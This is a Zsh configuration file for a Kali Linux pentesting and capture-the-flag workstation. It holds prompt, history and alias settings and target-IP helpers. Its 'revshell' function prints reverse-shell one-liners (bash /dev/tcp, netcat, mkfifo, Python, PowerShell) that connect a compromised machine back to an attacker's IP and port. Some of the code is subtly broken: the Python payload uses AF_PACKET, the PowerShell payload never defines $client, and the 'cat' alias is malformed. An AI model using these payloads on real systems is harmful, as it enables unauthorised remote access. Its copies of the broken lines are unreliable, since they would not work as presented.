# ==============================================================================
# 🛡️ ZSH CONFIGURATION - KALI CYBER ENVIRONMENT
# ==============================================================================

# Enable Colors
autoload -U colors && colors 2>/dev/null

# Oh-My-Zsh Path
export ZSH="$HOME/.oh-my-zsh"

# Theme Configuration
ZSH_THEME="robbyrussell"

# High-Productivity Plugins
plugins=(
    git
    sudo
    extract
    colored-man-pages
    history-substring-search
    zsh-autosuggestions
    zsh-syntax-highlighting
    fzf-tab
)

# Load Oh-My-Zsh if installed
if [ -f "$ZSH/oh-my-zsh.sh" ]; then
    source "$ZSH/oh-my-zsh.sh"
else
    autoload -Uz compinit && compinit -C 2>/dev/null || compinit 2>/dev/null
    zstyle ':completion:*' menu select 2>/dev/null || true
    zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 2>/dev/null || true
fi

# ==============================================================================
# HACKER PROMPT WITH REAL-TIME TARGET & VPN STATUS
# ==============================================================================

prompt_target_status() {
    local target_file="$HOME/.config/i3/target"
    if [ -f "$target_file" ]; then
        local target=$(head -n 1 "$target_file" 2>/dev/null | xargs)
        if [ -n "$target" ]; then
            echo "%B%F{red}[🎯 $target]%f%b "
        fi
    fi
}

prompt_vpn_status() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo "%B%F{green}[🛡️ $vpn_ip]%f%b "
    fi
}

# Fallback git prompt if oh-my-zsh is not active
if ! type git_prompt_info >/dev/null 2>&1; then
    git_prompt_info() {
        local branch=$(git symbolic-ref --short HEAD 2>/dev/null)
        if [ -n "$branch" ]; then
            local dirty=$(git status --porcelain 2>/dev/null | tail -n 1)
            if [ -n "$dirty" ]; then
                echo " %F{yellow}(git:$branch*)%f"
            else
                echo " %F{yellow}(git:$branch)%f"
            fi
        fi
    }
fi

# Return code indicator
prompt_status() {
    echo "%(?.%B%F{cyan}└─$%f%b.%B%F{red}└─[%?]✘$%f%b) "
}

# 2-Line Professional Cyber Prompt
setopt PROMPT_SUBST
PROMPT='$(prompt_target_status)$(prompt_vpn_status)%B%F{cyan}┌──(%F{blue}%n㉿%m%F{cyan})-[%F{white}%~%F{cyan}]%f%b$(git_prompt_info)
$(prompt_status)'

# ==============================================================================
# WELCOME BANNER ON NEW TERMINALS
# ==============================================================================
if [[ -o interactive ]]; then
    _vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [ -z "$_vpn_ip" ] && _vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    _tgt_ip=$(head -n 1 "$HOME/.config/i3/target" 2>/dev/null | xargs)

    echo ""
    echo "\033[1;36m  ⚡ KALI CYBER ENVIRONMENT \033[0;90m| \033[0;32mSession: $(whoami)@$(hostname)\033[0m"
    echo "\033[0;90m  ─────────────────────────────────────────────────────────\033[0m"
    echo "\033[0;33m  • Target:\033[0m \033[1;31m${_tgt_ip:-No Target Set}\033[0m  \033[0;90m|\033[0m  \033[0;33m• VPN:\033[0m \033[1;32m${_vpn_ip:-No VPN Active}\033[0m"
    echo "\033[0;90m  • Shortcuts: Mod+Return (Term) | Mod+u (Scratch) | Mod+d (Rofi)\033[0m"
    echo ""
fi

# ==============================================================================
# KEYBINDINGS & HISTORY SEARCH
# ==============================================================================
bindkey '^[[A' history-substring-search-up 2>/dev/null || bindkey '^[[A' up-line-or-history
bindkey '^[[B' history-substring-search-down 2>/dev/null || bindkey '^[[B' down-line-or-history
bindkey -M vicmd 'k' history-substring-search-up 2>/dev/null || true
bindkey -M vicmd 'j' history-substring-search-down 2>/dev/null || true

# Extended history configuration
HISTSIZE=50000
SAVEHIST=50000
HISTFILE="$HOME/.zsh_history"
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_IGNORE_SPACE

# ==============================================================================
# OFFENSIVE PENTESTING FUNCTIONS & ALIASES
# ==============================================================================

# Target IP Management
settar() {
    local ip="$1"
    if [ -z "$ip" ]; then
        read -p "Enter Target IP: " ip
    fi
    if [ -n "$ip" ]; then
        echo "$ip" > ~/.config/i3/target
        if command -v xclip >/dev/null 2>&1; then
            echo -n "$ip" | xclip -selection clipboard
        fi
        echo -e "\033[0;32m[+] Target set and copied to clipboard:\033[0m $ip"
        pkill -RTMIN+1 i3blocks 2>/dev/null || true
    fi
}

cleartar() {
    > ~/.config/i3/target
    echo -e "\033[1;33m[!] Target cleared.\033[0m"
    pkill -RTMIN+1 i3blocks 2>/dev/null || true
}

cptar() {
    local target=$(cat ~/.config/i3/target 2>/dev/null | xargs)
    if [ -n "$target" ]; then
        echo -n "$target" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] Copied to clipboard:\033[0m $target"
    else
        echo -e "\033[0;31m[-] No active Target set.\033[0m"
    fi
}

target() {
    cat ~/.config/i3/target 2>/dev/null || echo "No Target set"
}

# VPN IP Management
cpvpn() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo -n "$vpn_ip" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] VPN IP copied:\033[0m $vpn_ip"
    else
        echo -e "\033[0;31m[-] No active VPN connection.\033[0m"
    fi
}

vpn() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    echo "No VPN connected"
}

myip() {
    echo -n "Local IP:  " && ip route get 1.1.1.1 2>/dev/null | awk '{print $7}'
    echo -n "VPN IP:    " && (vpn)
    echo -n "Public IP: " && (curl -s --max-time 2 ifconfig.me || echo "Unavailable")
}

# CTF Folder Structure Generator
mktarget() {
    if [ -z "$1" ]; then
        echo "Usage: mktarget <MachineName>"
        return 1
    fi
    local name="$1"
    mkdir -p "$name"/{nmap,exploits,content,loot,scripts}
    cd "$name" || return
    echo -e "\033[0;32m[+] Directory structure created for:\033[0m $name"
    ls -la
}

# Quick Python HTTP Server
http-server() {
    local port="${1:-80}"
    echo -e "\033[0;32m[+] HTTP Server running on port $port (Ctrl+C to stop)...\033[0m"
    python3 -m http.server "$port"
}

# Listening Ports Viewer
ports() {
    echo -e "\033[1;36m[+] Active listening sockets:\033[0m"
    sudo ss -tulpn | grep LISTEN
}

# Quick Encoding & Decoding
b64e() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64
    else
        echo -n "$1" | base64
    fi
}

b64d() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64 -d
    else
        echo -n "$1" | base64 -d
    fi
    echo ""
}

urle() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

urld() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

# Quick Reverse Shell Generator
revshell() {
    local ip="${1:-$(vpn)}"
    local port="${2:-4444}"
    local type="${3:-bash}"

    if [ "$ip" = "No VPN connected" ] || [ -z "$ip" ]; then
        echo -e "\033[0;31m[-] Please specify an IP: revshell <IP> [PORT] [TYPE]\033[0m"
        return 1
    fi

    echo -e "\033[1;36m=== Reverse Shell Payloads ($ip:$port) ===\033[0m\n"
    case "$type" in
        bash)
            echo -e "\033[1;33mBash TCP:\033[0m"
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            echo ""
            echo -e "\033[1;33mBash Readline:\033[0m"
            echo "exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"
            ;;
        nc|netcat)
            echo -e "\033[1;33mNetcat Traditional:\033[0m"
            echo "nc -e /bin/bash $ip $port"
            echo ""
            echo -e "\033[1;33mNetcat OpenBSD (mkfifo):\033[0m"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        python|python3)
            echo -e "\033[1;33mPython 3:\033[0m"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_PACKET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
            ;;
        powershell|ps)
            echo -e "\033[1;33mPowerShell Base64:\033[0m"
            echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
    esac
}

# Enhanced Aliases
alias ls='ls --color=auto'
alias ll='ls -la --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias grep='grep --color=auto'
alias df='df -h'
alias free='free -m'
alias cat='batcat 2>/dev/null || bat 2>/dev/null || cat'

# FZF Configuration
if command -v fzf >/dev/null 2>&1; then
    export FZF_DEFAULT_OPTS='--height 40% --layout=reverse --border --color=bg+:#1f242c,bg:#0f141c,spinner:#7ee787,hl:#58a6ff,fg:#e6edf3,header:#58a6ff,info:#bc8cff,pointer:#ff7b72,marker:#7ee787,fg+:#ffffff,prompt:#58a6ff,hl+:#58a6ff'
fi
